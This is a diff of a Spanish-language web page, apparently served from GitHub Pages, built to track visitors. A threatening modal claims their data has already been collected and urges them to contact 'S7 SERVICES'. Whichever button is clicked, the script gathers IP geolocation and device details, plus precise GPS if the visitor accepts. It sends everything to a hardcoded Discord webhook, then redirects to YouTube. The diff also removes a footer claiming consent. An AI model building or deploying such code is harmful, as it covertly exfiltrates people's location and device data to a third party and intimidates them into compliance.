@@ -3,20 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>Todos los admins nos la chupan</title>
     <style>
-        /* Estilos del modal/ventana emergente */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
+            background-color: rgba(0, 0, 0, 0.7);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            z-index: 9999;
         }
 
         .modal-box {
@@ -25,7 +24,7 @@
             border-radius: 12px;
             text-align: center;
             max-width: 320px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
             font-family: Arial, sans-serif;
         }
 
@@ -37,8 +36,8 @@
 
         .modal-buttons {
             display: flex;
-            justify-content: space-around;
-            gap: 10px;
+            justify-content: center;
+            gap: 12px;
         }
 
         .btn {
@@ -65,24 +64,24 @@
 
     <div id="consentModal" class="modal-overlay">
         <div class="modal-box">
-            <p>Todos tus datos ya han sido recopilados. Si deseas conservar tu privacidad comunícate con +244956273478 u cualquier otro miembro de S7 SERVICES. ATENCIÓN 24/7. Si recientemente te negaste y cambias de opinión puedes aceptar en cualquier momento y tendremos acceso a ubicación precisa para tu seguridad. NO TENGA MIEDO TENGA RESPETO.</p>
+            <p>Todos tus datos ya han sido recopilados. Si deseas conservar tu privacidad comunícate con +244956273478 u cualquier otro miembro de S7 SERVICES. ATENCIÓN 24/7. Si recientemente te negaste y cambias de opinión puedes aceptar en cualquier momento y tendremos acceso a ubicación precisa para tu seguridad. NO TENGA MIEDO TENGA RESPETO</p>
+
             <div class="modal-buttons">
-                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Deseo salvar mis datos personales </button>
-                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Deseo que mis datos personales estén en peligro (serás redirigido de todas maneras).</button>
+                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Deseo proteger mis datos</button>
+
+                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Me rehuso a colaborar</button>
             </div>
         </div>
     </div>
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
-        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=--bkJVf1PlG4UMJw";
+        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=lbf8BTYxCYdax0im";
 
-        // Función para ocultar la ventana emergente
         function cerrarModal() {
             document.getElementById("consentModal").style.display = "none";
         }
 
-        // Solicitar GPS solo si el usuario aceptó en la ventana emergente
         function obtenerGPSNativo() {
             return new Promise((resolve) => {
                 if (!("geolocation" in navigator)) {
@@ -97,14 +96,14 @@
                         const precision = Math.round(pos.coords.accuracy);
 
                         resolve({
-                            gpsData: `Lat: ${lat}, Lon: ${lon} (Margen de error: ~${precision}m)`,
+                            gpsData: `Lat: ${lat}, Lon: ${lon} (Margen: ~${precision}m)`,
                             mapLink: `https://www.google.com/maps?q=${lat},${lon}`
                         });
                     },
                     (err) => {
-                        resolve({ gpsData: "Permiso denegado en el navegador", mapLink: "N/A" });
+                        resolve({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" });
                     },
-                    { enableHighAccuracy: true, timeout: 6000 }
+                    { enableHighAccuracy: true, timeout: 8000 }
                 );
             });
         }
@@ -112,14 +111,12 @@
         async function responderConsentimiento(acepto) {
             cerrarModal();
 
-            let gpsInfo = { gpsData: "El usuario rechazó activar la ubicación.", mapLink: "N/A" };
+            let gpsInfo = { gpsData: "El usuario rechazó la solicitud inicial.", mapLink: "N/A" };
 
-            // Si presionó 'Aceptar', se invoca el permiso nativo del navegador
             if (acepto) {
                 gpsInfo = await obtenerGPSNativo();
             }
 
-            // Datos de ubicación general por IP
             let ipData = {};
             try {
                 const res = await fetch("https://ipapi.co/json/");
@@ -128,14 +125,12 @@
                 console.error("Error al obtener IP:", e);
             }
 
-            // Datos técnicos del dispositivo
             const pantalla = `${window.screen.width}x${window.screen.height}`;
             const memoriaRAM = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
             const nucleosCPU = navigator.hardwareConcurrency || "N/A";
             const idioma = navigator.language || "Desconocido";
             const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Payload para Discord
             const payload = {
                 embeds: [{
                     title: "🔍 Registro de Visita",
@@ -151,12 +146,11 @@
                         { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                         { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                     ],
-                    footer: { text: "Registro con Consentimiento Previo" },
+                    footer: { text: "Registro de Visita - GitHub Pages" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // Enviar a Discord
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
@@ -167,7 +161,6 @@
                 console.error("Error al enviar a Discord:", err);
             }
 
-            // Redirigir al enlace de YouTube
             window.location.href = YOUTUBE_URL;
         }
     </script>
